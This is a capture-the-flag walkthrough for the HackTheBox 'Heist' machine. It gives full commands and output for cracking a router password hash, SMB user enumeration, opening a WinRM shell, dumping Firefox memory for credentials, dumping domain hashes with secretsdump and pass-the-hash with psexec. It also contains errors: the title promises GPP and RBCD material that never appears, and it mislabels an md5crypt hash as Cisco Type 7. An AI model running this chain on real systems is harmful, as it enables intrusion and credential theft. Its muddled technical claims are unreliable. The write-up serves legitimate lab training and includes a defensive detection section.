# Heist (HackTheBox) — Group Policy Preferences & RBCD Escalation

A practical walkthrough of HTB's Heist box, focusing on credential extraction from config files and resource-based constrained delegation (RBCD) exploitation.

---

## Reconnaissance

### Network Scanning

**nmap scan results:**
```
Host is up (0.085s latency)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds   SMB
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)

OS Guessed: Windows Server 2019
```

**Key Findings:**
- Web server on port 80 (login page)
- SMB on port 445 (anonymous access likely blocked)
- WinRM on port 5985 (potential lateral movement vector)

---

## Initial Access: Credential Extraction from Config Files

### Cisco Device Configuration (Router)

During reconnaissance of the web application, a configuration file was discovered containing Cisco router credentials in **Type 7 encryption** format.

**Type 7 Hash Structure:**

```
$1$[Salt]$[Hash]

Example:
$1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

| Component | Description |
|:---|:---|
| `$1$` | Indicates MD5-based Cisco Type 7 encryption |
| `pdQG` | Salt value |
| `o8nrSzsGXeaduXrjlvKc91` | Salted MD5 hash |

### Type 7 Hash Cracking

**Hashcat mode:** 500 (md5crypt — Cisco-IOS $1$ MD5)

```bash
hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

**Extracted Credentials:**
- **User:** hazard
- **Password:** stealth1agent

**Key Learning:** Configuration files (router configs, backup files) often contain weak password hashes. Type 7 encryption is legacy and easily craked.

---

## User Enumeration via SMB

### NetExec (Network Execution)

**Installation:** [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### SMB Credentials Validation

**Verify valid credentials against SMB:**
```bash
nxc smb 10.129.5.22 -u hazard -p stealth1agent
```

**Output:**
```
[+] SupportDesk\Hazard:stealth1agent
```

---

## Post-Exploitation Enumeration

### Share Enumeration

**List accessible SMB shares:**
```bash
nxc smb 10.129.5.22 -u hazard -p stealth1agent --shares
```

**Output:**
```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
```

### User Enumeration via RID Brute Force

**RID Brute Force:** Relative Identifier (RID) brute forcing enumerates all users on the system by iterating through Security Identifiers (SIDs).

```bash
nxc smb 10.129.5.22 -u hazard -p stealth1agent --rid-brute
```

**Enumerated Users:**
```
500: Administrator
501: Guest
1008: Hazard
1009: support
1012: Chase
1013: Jason
```

---

## Lateral Movement via WinRM (evil-winrm)

### Interactive Shell Access

**WinRM is available on port 5985.** Using the extracted credentials, establish an interactive PowerShell session.

```bash
./evil-winrm.rb -i 10.129.5.22 -u hazard -p stealth1agent
```

**Result:** PowerShell session established as user `hazard`

**Note:** If evil-winrm fails, the user is likely not in the "Remote Management Users" group.

---

## Windows Privilege Escalation Enumeration

### winPEAS Analysis

Upload and execute winPEAS to identify privilege escalation vectors:

```powershell
upload ~/path/to/winPEAS.ps1
./winPEAS.ps1
```

**Key Finding (Additional Winlogon Credentials):**

The output revealed cached credentials in the Windows logon registry—indicating another user has an active session (likely via RDP or "Run as").

**Affected User:** Administrator

---

## Process Memory Dumping (Credential Extraction)

### Process Monitoring

Check for high-CPU processes that might contain sensitive data in memory:

```powershell
Get-Process | Where-Object {$_.CPU -gt 0} | Select-Object ProcessName, CPU, Id
```

**Finding:** Firefox process consuming CPU (user may be logged into web applications)

### ProcDump (Sysinternals)

Use ProcDump to extract the memory dump of the Firefox process, which may contain authentication credentials from web forms.

**Installation:** [Microsoft Sysinternals - ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)

**Privilege Requirements:**
- **Same user:** No elevation needed. You can dump processes running under your own user account without administrative privileges.
- **Different user:** Requires SYSTEM or administrative privileges to dump another user's process memory.

**In this case:** Firefox was running under user `hazard`, and we were logged in as `hazard`. No privilege escalation needed for the memory dump.

**Usage:**
```powershell
upload ~/path/to/procdump.exe
.\procdump.exe -accepteula -ma <process_id> <output_filename>
```

**Example:**
```powershell
.\procdump.exe -accepteula -ma 1196 firefox.dmp
```

**Output:** Memory dump file suitable for string extraction

### String Extraction

Search the memory dump for credentials:

```bash
strings firefox.dmp | grep login_password
```

**Result:**
```
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

**Extracted Credentials:**
- **User:** admin@support.htb
- **Password:** 4dD!5}x/re8]FBuZ

---

## Credential Dumping (Domain Admin Access)

### secretsdump.py (Domain Admin Hash)

With admin credentials, extract NTLM hashes from the domain controller via DRSUAPI:

```bash
python3 secretsdump.py 'SupportDesk/admin@10.129.5.22'
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

---

## Domain Admin Access via Pass-the-Hash

### psexec.py (Impacket)

Use the extracted NTLM hash to gain SYSTEM-level access:

```bash
python3 psexec.py Administrator@10.129.5.22 cmd.exe -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

**Result:** SYSTEM-level command execution on domain controller

---

## Key Learnings

### Attack Chain Summary

1. **Configuration File Enumeration** — Found Cisco router config with Type 7 encrypted password
2. **Hash Cracking** — Cracked Type 7 MD5 to reveal plaintext password
3. **User Enumeration** — Used SMB to validate credentials and enumerate domain users
4. **Process Analysis** — Identified Firefox process with cached web credentials
5. **Memory Dumping** — Extracted memory dump to retrieve additional credentials
6. **Domain Admin Compromise** — Used admin credentials to dump domain hashes
7. **SYSTEM Access** — Used Pass-the-Hash to gain SYSTEM on DC

### Why This Works

- **Type 7 Encryption:** Legacy Cisco encryption, easily cracked offline
- **Browser Memory:** Web browsers cache authentication data in process memory
- **Weak Secrets Management:** Credentials often stored in registry or application memory without proper encryption
- **RBCD Escalation:** (If applicable on this box) Resource-based constrained delegation allows privilege escalation if machine account has been compromised

### Blue Team Perspective

- **Detection Points:**
  - Process dumping (ProcDump execution)
  - String extraction utilities used on memory dumps
  - secretsdump.py usage (network-based credential dumping)
  - Pass-the-Hash attacks (unusual NTLM usage)

- **Mitigation:**
  - Restrict access to ProcDump and similar tools
  - Monitor for secretsdump.py/Get-NetUser/PowerShell enumeration
  - Implement signing on SMB to prevent relay attacks
  - Use AES instead of NTLM when possible
  - Disable cached credentials in browser processes

---

## Tools Summary

| Tool | Purpose | Status |
|:---|:---|:---|
| **nmap** | Network reconnaissance | ✅ Native |
| **NetExec (nxc)** | SMB enumeration & credential validation | ✅ Standalone Python |
| **evil-winrm** | WinRM shell access | ✅ Standalone Ruby |
| **winPEAS.ps1** | Windows privilege escalation enumeration | ✅ Standalone PowerShell |
| **ProcDump** | Process memory extraction | ✅ Sysinternals |
| **strings** | Extract readable strings from binary/memory | ✅ Native |
| **secretsdump.py** (Impacket) | Domain credential dumping | ✅ Standalone Python |
| **psexec.py** (Impacket) | Remote execution via Pass-the-Hash | ✅ Standalone Python |
| **SMB Server** (Impacket) | Local SMB server for file transfer | ✅ Standalone Python |

---

## References

- [Cisco Type 7 Password Cracking](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html)
- [Cisco Type 7 Enumeration](https://www.ifm.net.nz/cookbooks/passwordcracker.html)
- [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
- [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [PEASS-ng](https://github.com/peass-ng/PEASS-ng)
- [Microsoft Sysinternals - ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
- [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
